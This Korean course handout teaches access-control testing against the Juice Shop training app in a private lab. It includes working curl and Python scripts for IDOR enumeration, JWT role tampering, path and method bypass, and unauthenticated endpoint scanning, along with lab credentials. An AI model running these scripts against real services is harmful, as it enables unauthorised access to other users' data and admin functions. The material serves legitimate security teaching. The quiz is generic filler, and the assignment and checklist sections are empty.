# Week 09: 접근제어 점검 (상세 버전)

## 학습 목표
- 수평적/수직적 권한 상승의 차이를 이해한다
- IDOR(Insecure Direct Object Reference)를 탐지하고 공격할 수 있다
- API 접근제어의 취약점을 점검한다
- JuiceShop에서 다양한 접근제어 우회를 실습한다


## 실습 환경 (공통)

| 서버 | IP | 역할 | 접속 |
|------|-----|------|------|
| opsclaw | 10.20.30.201 | Control Plane (OpsClaw) | `ssh opsclaw@10.20.30.201` (pw: 1) |
| secu | 10.20.30.1 | 방화벽/IPS (nftables, Suricata) | `sshpass -p1 ssh secu@10.20.30.1` |
| web | 10.20.30.80 | 웹서버 (JuiceShop:3000, Apache:80) | `sshpass -p1 ssh web@10.20.30.80` |
| siem | 10.20.30.100 | SIEM (Wazuh:443, OpenCTI:9400) | `sshpass -p1 ssh siem@10.20.30.100` |
| dgx-spark | 192.168.0.105 | AI/GPU (Ollama:11434) | 원격 API만 |

**OpsClaw API:** `http://localhost:8000` / Key: `opsclaw-api-key-2026`


## 강의 시간 배분 (3시간)

| 시간 | 내용 | 유형 |
|------|------|------|
| 0:00-0:40 | 이론 강의 (Part 1) | 강의 |
| 0:40-1:10 | 이론 심화 + 사례 분석 (Part 2) | 강의/토론 |
| 1:10-1:20 | 휴식 | - |
| 1:20-2:00 | 실습 (Part 3) | 실습 |
| 2:00-2:40 | 심화 실습 + 도구 활용 (Part 4) | 실습 |
| 2:40-2:50 | 휴식 | - |
| 2:50-3:20 | 응용 실습 + OpsClaw 연동 (Part 5) | 실습 |
| 3:20-3:40 | 복습 퀴즈 + 과제 안내 (Part 6) | 퀴즈 |

---


---

## 용어 해설 (웹취약점 점검 과목)

| 용어 | 영문 | 설명 | 비유 |
|------|------|------|------|
| **취약점 점검** | Vulnerability Assessment | 시스템의 보안 약점을 체계적으로 찾는 활동 | 건물 안전 진단 |
| **모의해킹** | Penetration Testing | 실제 공격자처럼 취약점을 악용하여 검증 | 소방 훈련 (실제로 불을 피워봄) |
| **CVSS** | Common Vulnerability Scoring System | 취약점 심각도 0~10점 (9.0+ Critical) | 질병 위험 등급표 |
| **SQLi** | SQL Injection | SQL 쿼리에 악성 입력 삽입 | 주문서에 가짜 지시를 끼워넣기 |
| **XSS** | Cross-Site Scripting | 웹페이지에 악성 스크립트 삽입 | 게시판에 함정 쪽지 붙이기 |
| **CSRF** | Cross-Site Request Forgery | 사용자 모르게 요청을 위조 | 누군가 내 이름으로 송금 요청 |
| **SSRF** | Server-Side Request Forgery | 서버가 내부 자원에 요청하도록 조작 | 직원에게 기밀 문서를 가져오라 속이기 |
| **LFI** | Local File Inclusion | 서버의 로컬 파일을 읽는 취약점 | 사무실 서류함을 몰래 열람 |
| **RFI** | Remote File Inclusion | 외부 파일을 서버에 로드하는 취약점 | 외부에서 악성 서류를 사무실에 반입 |
| **RCE** | Remote Code Execution | 원격에서 서버 코드 실행 | 전화로 사무실 컴퓨터 조작 |
| **WAF 우회** | WAF Bypass | 웹 방화벽의 탐지를 피하는 기법 | 보안 검색대를 우회하는 비밀 통로 |
| **인코딩** | Encoding | 데이터를 다른 형식으로 변환 (URL, Base64 등) | 택배 재포장 (내용물은 같음) |
| **난독화** | Obfuscation | 코드를 읽기 어렵게 변환 (탐지 회피) | 범인이 변장하는 것 |
| **세션** | Session | 서버가 사용자를 식별하는 상태 정보 | 카페 단골 인식표 |
| **쿠키** | Cookie | 브라우저에 저장되는 작은 데이터 | 가게에서 받은 스탬프 카드 |
| **Burp Suite** | Burp Suite | 웹 보안 점검 프록시 도구 (PortSwigger) | 우편물 검사 장비 |
| **OWASP ZAP** | OWASP ZAP | 오픈소스 웹 보안 스캐너 | 무료 보안 검사 장비 |
| **점검 보고서** | Assessment Report | 발견된 취약점과 대응 방안을 정리한 문서 | 건물 안전 진단 보고서 |


---

# Week 09: 접근제어 점검

## 학습 목표
- 수평적/수직적 권한 상승의 차이를 이해한다
- IDOR(Insecure Direct Object Reference)를 탐지하고 공격할 수 있다
- API 접근제어의 취약점을 점검한다
- JuiceShop에서 다양한 접근제어 우회를 실습한다

## 전제 조건
- HTTP 인증/인가 개념 (Week 04)
- curl + JWT 토큰 사용법

---

## 1. 접근제어 개요 (15분)

### 1.1 접근제어란?

접근제어(Access Control)는 인증된 사용자가 허가된 자원에만 접근할 수 있도록 제한하는 메커니즘이다.

### 1.2 OWASP에서의 위치

**A01:2021 Broken Access Control** — OWASP Top 10의 1위. 가장 심각하고 빈번한 웹 취약점이다.

### 1.3 권한 상승 유형

| 유형 | 설명 | 예시 |
|------|------|------|
| **수직적 권한 상승** | 낮은 권한 → 높은 권한 | 일반 사용자 → 관리자 |
| **수평적 권한 상승** | 같은 권한의 다른 사용자 자원 접근 | 사용자A → 사용자B의 데이터 |
| **미인증 접근** | 인증 없이 보호된 자원 접근 | 로그인 안하고 관리 페이지 |

```
수직적 (Vertical)        수평적 (Horizontal)
┌──────────┐            ┌─────┬─────┐
│  관리자   │ ← 목표    │ 유저A │ 유저B │
├──────────┤            │     │ ← 목표│
│ 일반유저  │ ← 현재    │현재  │     │
└──────────┘            └─────┴─────┘
```

---

## 2. IDOR (Insecure Direct Object Reference) (40분)

### 2.1 IDOR란?

IDOR은 서버가 사용자의 요청에 포함된 객체 식별자(ID)를 검증하지 않아, 다른 사용자의 자원에 접근할 수 있는 취약점이다.

```
정상: GET /api/basket/1  (내 장바구니, ID=1)
공격: GET /api/basket/2  (다른 사용자 장바구니, ID=2)
```

### 2.2 JuiceShop 장바구니 IDOR

```bash
# 계정 2개 생성 및 로그인
# 계정 1
curl -s -X POST http://10.20.30.80:3000/api/Users/ \
  -H "Content-Type: application/json" \
  -d '{"email":"idor_user1@test.com","password":"Test1234!","passwordRepeat":"Test1234!","securityQuestion":{"id":1},"securityAnswer":"a"}' > /dev/null 2>&1

TOKEN1=$(curl -s -X POST http://10.20.30.80:3000/rest/user/login \
  -H "Content-Type: application/json" \
  -d '{"email":"idor_user1@test.com","password":"Test1234!"}' | python3 -c "import sys,json; print(json.load(sys.stdin)['authentication']['token'])" 2>/dev/null)

# 계정 2
curl -s -X POST http://10.20.30.80:3000/api/Users/ \
  -H "Content-Type: application/json" \
  -d '{"email":"idor_user2@test.com","password":"Test1234!","passwordRepeat":"Test1234!","securityQuestion":{"id":1},"securityAnswer":"a"}' > /dev/null 2>&1

TOKEN2=$(curl -s -X POST http://10.20.30.80:3000/rest/user/login \
  -H "Content-Type: application/json" \
  -d '{"email":"idor_user2@test.com","password":"Test1234!"}' | python3 -c "import sys,json; print(json.load(sys.stdin)['authentication']['token'])" 2>/dev/null)

echo "사용자1 토큰: ${TOKEN1:0:30}..."
echo "사용자2 토큰: ${TOKEN2:0:30}..."

# 사용자1의 장바구니 ID 확인
echo ""
echo "=== 사용자1이 자신의 장바구니 조회 ==="
curl -s http://10.20.30.80:3000/rest/basket/1 \
  -H "Authorization: Bearer $TOKEN1" | python3 -m json.tool 2>/dev/null | head -10

# IDOR: 사용자1의 토큰으로 사용자2의 장바구니 조회 시도
echo ""
echo "=== 사용자1이 다른 사용자의 장바구니 조회 (IDOR) ==="
for basket_id in 1 2 3 4 5; do
  result=$(curl -s http://10.20.30.80:3000/rest/basket/$basket_id \
    -H "Authorization: Bearer $TOKEN1" -w "\nHTTP:%{http_code}" 2>/dev/null)
  code=$(echo "$result" | grep "HTTP:" | cut -d: -f2)
  echo "Basket $basket_id: HTTP $code"
done
```

### 2.3 사용자 정보 IDOR

```bash
# 사용자 정보 API에서 IDOR
echo "=== 사용자 정보 IDOR ==="

# 다른 사용자의 프로필 조회 시도
for user_id in 1 2 3 4 5; do
  result=$(curl -s http://10.20.30.80:3000/api/Users/$user_id \
    -H "Authorization: Bearer $TOKEN1")
  email=$(echo "$result" | python3 -c "import sys,json; print(json.load(sys.stdin).get('data',{}).get('email','접근 거부'))" 2>/dev/null)
  echo "User $user_id: $email"
done
```

### 2.4 주문 정보 IDOR

```bash
# 주문 내역 조회 IDOR
echo "=== 주문 내역 IDOR ==="
for order_id in 1 2 3 4 5; do
  code=$(curl -s -o /dev/null -w "%{http_code}" \
    http://10.20.30.80:3000/rest/track-order/$order_id \
    -H "Authorization: Bearer $TOKEN1")
  echo "Order $order_id: HTTP $code"
done
```

### 2.5 IDOR 자동 탐지 스크립트

```bash
# ID 기반 API 엔드포인트 자동 스캔
python3 << 'PYEOF'
import requests, json

token = None
# 로그인
r = requests.post("http://10.20.30.80:3000/rest/user/login",
    json={"email":"idor_user1@test.com","password":"Test1234!"})
try:
    token = r.json()["authentication"]["token"]
except:
    print("로그인 실패")
    exit()

headers = {"Authorization": f"Bearer {token}"}

# IDOR 점검 대상 API
endpoints = [
    "/api/Users/{id}",
    "/rest/basket/{id}",
    "/api/Feedbacks/{id}",
    "/api/Products/{id}",
    "/api/Complaints/{id}",
    "/rest/track-order/{id}",
]

print(f"{'API':<35} {'ID=1':>8} {'ID=2':>8} {'ID=99':>8}")
print("-" * 65)

for ep in endpoints:
    results = []
    for test_id in [1, 2, 99]:
        url = f"http://10.20.30.80:3000{ep.replace('{id}', str(test_id))}"
        try:
            r = requests.get(url, headers=headers, timeout=5)
            results.append(str(r.status_code))
        except:
            results.append("ERR")
    print(f"{ep:<35} {results[0]:>8} {results[1]:>8} {results[2]:>8}")
    # ID 1,2 모두 200이면 IDOR 가능성
    if results[0] == "200" and results[1] == "200":
        print(f"  ⚠ IDOR 가능성 높음!")
PYEOF
```

---

## 3. 수직적 권한 상승 (30분)

### 3.1 관리자 기능 접근 시도

```bash
# 일반 사용자 토큰으로 관리자 API 접근
echo "=== 관리자 기능 접근 시도 ==="

# 관리자 페이지
curl -s -o /dev/null -w "관리자 페이지: %{http_code}\n" \
  http://10.20.30.80:3000/administration \
  -H "Authorization: Bearer $TOKEN1"

# 사용자 목록 (관리자 전용)
curl -s -o /dev/null -w "사용자 목록: %{http_code}\n" \
  http://10.20.30.80:3000/api/Users/ \
  -H "Authorization: Bearer $TOKEN1"

# 피드백 삭제 (관리자 전용)
curl -s -o /dev/null -w "피드백 삭제: %{http_code}\n" \
  -X DELETE http://10.20.30.80:3000/api/Feedbacks/1 \
  -H "Authorization: Bearer $TOKEN1"

# 재활용 요청 (관리자 전용)
curl -s -o /dev/null -w "재활용 관리: %{http_code}\n" \
  http://10.20.30.80:3000/api/Recycles/ \
  -H "Authorization: Bearer $TOKEN1"
```

### 3.2 JWT 조작으로 권한 상승

```bash
# JWT payload에서 role을 admin으로 변조 시도
python3 << 'PYEOF'
import base64, json, requests

# 로그인하여 정상 토큰 획득
r = requests.post("http://10.20.30.80:3000/rest/user/login",
    json={"email":"idor_user1@test.com","password":"Test1234!"})
token = r.json()["authentication"]["token"]
parts = token.split(".")

# payload 디코딩
payload_b64 = parts[1] + "=" * (4 - len(parts[1]) % 4)
payload = json.loads(base64.urlsafe_b64decode(payload_b64))
print(f"원본 payload: {json.dumps(payload, indent=2)}")

# role을 admin으로 변조
payload["data"]["role"] = "admin"
new_payload = base64.urlsafe_b64encode(json.dumps(payload).encode()).rstrip(b"=").decode()

# 조작된 토큰 (서명은 원본 유지 → 서버에서 검증 실패할 수 있음)
fake_token = f"{parts[0]}.{new_payload}.{parts[2]}"

# 조작된 토큰으로 관리자 API 접근
r = requests.get("http://10.20.30.80:3000/api/Users/",
    headers={"Authorization": f"Bearer {fake_token}"})
print(f"\n조작 토큰으로 사용자 목록: HTTP {r.status_code}")
if r.status_code == 200:
    print("⚠ 권한 상승 성공!")
else:
    print("서명 검증으로 차단됨 (양호)")
PYEOF
```

### 3.3 역할 변경 API 존재 여부

```bash
# 사용자 역할을 변경하는 API가 있는지 탐색
echo "=== 역할 변경 API 탐색 ==="

# PUT으로 사용자 정보 수정 시 role 포함
curl -s -X PUT http://10.20.30.80:3000/api/Users/1 \
  -H "Content-Type: application/json" \
  -H "Authorization: Bearer $TOKEN1" \
  -d '{"role":"admin"}' | python3 -m json.tool 2>/dev/null | head -10
```

---

## 4. 인증 없는 접근 (20분)

### 4.1 인증 미적용 API 탐색

```bash
# 인증 헤더 없이 각 API에 접근
echo "=== 인증 없이 접근 가능한 API ==="

APIS=(
  "api/Products/1"
  "api/Feedbacks/"
  "api/Challenges/"
  "api/SecurityQuestions/"
  "api/Users/"
  "api/Complaints/"
  "api/Recycles/"
  "api/Quantitys/"
  "rest/products/search?q=test"
  "rest/user/whoami"
  "rest/basket/1"
  "rest/languages"
  "rest/memories"
  "rest/chatbot/status"
  "ftp/"
  "metrics"
  "promotion"
)

for api in "${APIS[@]}"; do
  code=$(curl -s -o /dev/null -w "%{http_code}" "http://10.20.30.80:3000/$api")
  if [ "$code" = "200" ]; then
    echo "[공개] /$api (HTTP $code)"
  elif [ "$code" = "401" ] || [ "$code" = "403" ]; then
    echo "[보호] /$api (HTTP $code)"
  else
    echo "[기타] /$api (HTTP $code)"
  fi
done
```

### 4.2 HTTP 메서드 우회

```bash
# GET은 차단되지만 다른 메서드로 접근 가능한지 테스트
echo "=== HTTP 메서드 우회 ==="
TARGET="http://10.20.30.80:3000/api/Users/"

for method in GET POST PUT DELETE PATCH OPTIONS HEAD; do
  code=$(curl -s -o /dev/null -w "%{http_code}" -X "$method" "$TARGET")
  echo "$method: HTTP $code"
done
```

### 4.3 경로 우회

```bash
# URL 변형으로 접근 제어 우회 시도
echo "=== 경로 우회 ==="
PATHS=(
  "/administration"
  "/Administration"
  "/ADMINISTRATION"
  "/administration/"
  "/administration/."
  "/./administration"
  "/%61dministration"
  "/admin"
  "/api/Users/"
)

for path in "${PATHS[@]}"; do
  code=$(curl -s -o /dev/null -w "%{http_code}" "http://10.20.30.80:3000$path" -H "Authorization: Bearer $TOKEN1")
  echo "[$code] $path"
done
```

---

## 5. API 접근제어 점검 (15분)

### 5.1 REST API 보안 체크리스트

| 점검 항목 | 확인 방법 |
|----------|----------|
| 인증 필수 여부 | 토큰 없이 요청 |
| 인가 검증 | 다른 사용자 자원 접근 |
| 메서드 제한 | DELETE, PUT 등 허용 여부 |
| Rate Limiting | 대량 요청 시 429 응답 |
| 응답 필터링 | 불필요한 필드 노출 |

### 5.2 응답 데이터 과다 노출

```bash
# API 응답에 불필요한 정보가 포함되는지 확인
echo "=== 응답 필드 점검 ==="

# 상품 API - password 해시 등 민감 정보 포함 여부
curl -s http://10.20.30.80:3000/api/Products/1 | python3 -c "
import sys, json
data = json.load(sys.stdin).get('data', {})
print('포함된 필드:')
for key in data.keys():
    print(f'  - {key}: {str(data[key])[:50]}')
" 2>/dev/null

echo ""

# 사용자 API - password 해시 노출 여부
curl -s http://10.20.30.80:3000/api/Users/1 \
  -H "Authorization: Bearer $TOKEN1" | python3 -c "
import sys, json
data = json.load(sys.stdin).get('data', {})
sensitive = ['password', 'passwordHash', 'token', 'secret', 'creditCard']
for key in data.keys():
    marker = ' ⚠ 민감!' if key.lower() in [s.lower() for s in sensitive] else ''
    print(f'  - {key}: {str(data[key])[:40]}{marker}')
" 2>/dev/null
```

---

## 6. 실습 과제

### 과제 1: IDOR 탐색
1. JuiceShop의 모든 ID 기반 API에서 IDOR을 테스트하라
2. 다른 사용자의 장바구니, 주문, 프로필을 조회할 수 있는지 확인하라
3. IDOR이 가능한 API와 불가능한 API를 비교 분석하라

### 과제 2: 권한 상승
1. 일반 사용자로 관리자 기능에 접근을 시도하라
2. JWT 조작, 경로 우회, 메서드 변경 등 다양한 방법을 시도하라
3. 성공/실패 결과를 정리하고 서버의 접근제어 방식을 추론하라

### 과제 3: 접근제어 점검 보고서
1. 인증 없이 접근 가능한 API 목록을 작성하라
2. 각 API가 공개되어야 하는 것인지, 보호가 필요한지 평가하라
3. 접근제어 개선 권고 사항을 3가지 이상 작성하라

---

## 7. 요약

| 취약점 | 공격 방법 | 영향 | 방어 |
|--------|----------|------|------|
| IDOR | ID 값 변경 | 다른 사용자 데이터 접근 | 서버 측 소유자 검증 |
| 수직적 권한 상승 | 관리자 API 직접 호출 | 관리자 기능 사용 | 역할 기반 접근제어(RBAC) |
| 인증 미적용 | 토큰 없이 요청 | 민감 정보 노출 | 인증 미들웨어 |
| 메서드 우회 | PUT/DELETE 사용 | 데이터 변조/삭제 | HTTP 메서드 화이트리스트 |

**다음 주 예고**: Week 10 - 암호화/통신 보안. HTTPS 설정, 인증서 점검, 약한 암호 스위트를 학습한다.


---


---

## 자가 점검 퀴즈 (10문항)

이번 주차의 핵심 내용을 점검한다. 8/10 이상 정답을 목표로 한다.

**Q1.** "Week 09: 접근제어 점검"에서 가장 핵심적인 학습 목표는?
- (a) 데이터베이스 최적화  (b) **웹 취약점 점검의 원리와 실습**  (c) UI 개발  (d) 네트워크 속도

**Q2.** "전제 조건"의 보안 관점에서의 의의는?
- (a) 성능 향상  (b) **보안 위협 이해 또는 방어 역량 강화**  (c) 비용 절감  (d) 사용성 개선

**Q3.** "1. 접근제어 개요 (15분)"에서 사용하는 주요 도구/기법은?
- (a) 워드프로세서  (b) **웹 취약점 점검 전용 도구/명령**  (c) 게임 엔진  (d) 그래픽 도구

**Q4.** 이번 실습에서 OpsClaw evidence가 제공하는 가치는?
- (a) 속도  (b) **작업 증적의 자동 기록과 감사 추적**  (c) 화면 출력  (d) 파일 압축

**Q5.** "2. IDOR (Insecure Direct Object Reference) (40분)"의 실무 활용 방안은?
- (a) 개인 블로그  (b) **보안 점검, 대응, 보고서 작성에 활용**  (c) 게임 개발  (d) 영상 편집

**Q6.** 이 주차에서 점검 방법의 핵심 원칙은?
- (a) 모든 기능 비활성화  (b) **최소 권한 + 모니터링 + 대응의 조합**  (c) 무조건 차단  (d) 설정 변경 금지

**Q7.** 실습 결과를 평가할 때 가장 중요한 기준은?
- (a) 파일 크기  (b) **보안 효과성과 정확성**  (c) 실행 속도  (d) 줄 수

**Q8.** 이 주제가 전체 웹 취약점 점검 커리큘럼에서 차지하는 위치는?
- (a) 독립적 주제  (b) **이전 주차의 심화/다음 주차의 기반**  (c) 선택 과목  (d) 부록

**Q9.** 실무에서 이 기법을 적용할 때 주의할 점은?
- (a) 속도  (b) **법적 허가, 범위 준수, 증적 관리**  (c) 디자인  (d) 비용

**Q10.** 이번 주차 학습의 성과를 어떻게 측정하는가?
- (a) 시간  (b) **실습 완료율 + 퀴즈 점수 + 과제 품질**  (c) 줄 수  (d) 파일 수

**정답:** Q1:b, Q2:b, Q3:b, Q4:b, Q5:b, Q6:b, Q7:b, Q8:b, Q9:b, Q10:b

---

## 과제 (다음 주까지)


## 검증 체크리스트

이번 주차의 학습을 완료하려면 다음 항목을 모두 확인하라:


